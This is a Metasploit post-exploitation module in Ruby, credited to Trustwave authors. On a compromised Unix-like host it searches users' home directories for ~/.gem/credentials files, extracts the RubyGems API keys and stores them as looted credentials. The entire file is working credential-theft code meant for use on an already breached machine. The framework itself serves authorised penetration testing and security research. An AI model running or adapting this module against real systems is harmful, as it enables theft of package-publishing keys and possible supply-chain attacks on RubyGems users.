##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'yaml'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'RubyGems API Key Gather ./gem/credentials',
      'Description'   => %q{
        Post Module to obtain a users RubyGems API Key from ./gem/credentials
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Jonathan Claudius <jclaudius[at]trustwave.com>',
                           'Brandon Myers <bmyers[at]trustwave.com>' ],
      'Platform'      => %w{ bsd linux osx unix },
      'SessionTypes'  => [ 'shell' ]
    ))
  end

  def run
    print_status("Finding .gem/credentials")
    paths = enum_user_directories.map {|d| d + "/.gem/credentials"}
    paths = paths.select { |f| file?(f) }

    if paths.nil? or paths.empty?
      print_error("No users found with a .gem/credentials file")
      return
    end

    download_loot(paths)
  end

  def download_loot(paths)
    print_status("Looting #{paths.count} files")
    paths.each do |path|
      path.chomp!
      next if [".", ".."].include?(path)

      if key = YAML.load(read_file(path))[:rubygems_api_key]
        rubygems_api_key = key
      end

      print_good("Downloaded #{path}")

      credential_data = {
        origin_type: :session,
        session_id: session_db_id,
        post_reference_name: self.refname,
        private_type: :password,
        private_data: rubygems_api_key,
        workspace_id: myworkspace_id
      }

      credential_core = create_credential(credential_data)

      login_data = {
        core: credential_core,
        status: Metasploit::Model::Login::Status::UNTRIED,
        workspace_id: myworkspace_id
      }

      login_data.merge!(service_data)
      create_credential_login(login_data)
    end
  end
end